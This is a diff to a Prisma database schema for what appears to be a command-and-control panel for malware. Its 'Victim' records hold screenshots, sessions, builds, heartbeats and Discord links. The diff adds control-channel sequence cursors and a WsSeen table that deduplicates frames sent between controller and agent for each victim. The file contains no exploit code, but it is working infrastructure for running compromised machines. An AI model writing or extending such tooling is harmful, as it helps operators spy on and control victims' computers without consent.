@@ -144,6 +144,9 @@ model Victim {
   lastHeartbeatAt DateTime         @default(now())
   /// Liveness from a real agent message; bridge pings never touch it.
   lastAgentMessageAt DateTime      @default(now())
+  /// Control-channel cursors: last seq accepted from / processed outbound.
+  wsSeqIn         BigInt           @default(0)
+  wsSeqOut        BigInt           @default(0)
   revokedAt       DateTime?
   build           Build            @relation(fields: [buildId], references: [id], onDelete: Restrict)
   sessions        SessionInfo[]
@@ -156,6 +159,7 @@ model Victim {
   screenshots     Screenshot[]
   events          Event[]
   notifications   Notification[]
+  wsSeen          WsSeen[]
   discord         DiscordLink?
 
   @@unique([buildId, hostname, username])
@@ -380,6 +384,20 @@ model DiscordPart {
 
   @@unique([channelId, base, index])
   @@index([channelId, base])
+}
+
+model WsSeen {
+  id        BigInt   @id @default(autoincrement())
+  victimId  String   @db.Uuid
+  /// `c2a` or `a2c`.
+  direction String   @db.VarChar(3)
+  frameId   String   @db.Uuid
+  seq       BigInt
+  at        DateTime @default(now())
+  victim    Victim   @relation(fields: [victimId], references: [id], onDelete: Cascade)
+
+  @@unique([victimId, direction, frameId])
+  @@index([victimId, direction, id])
 }
 
 model AuditLog {
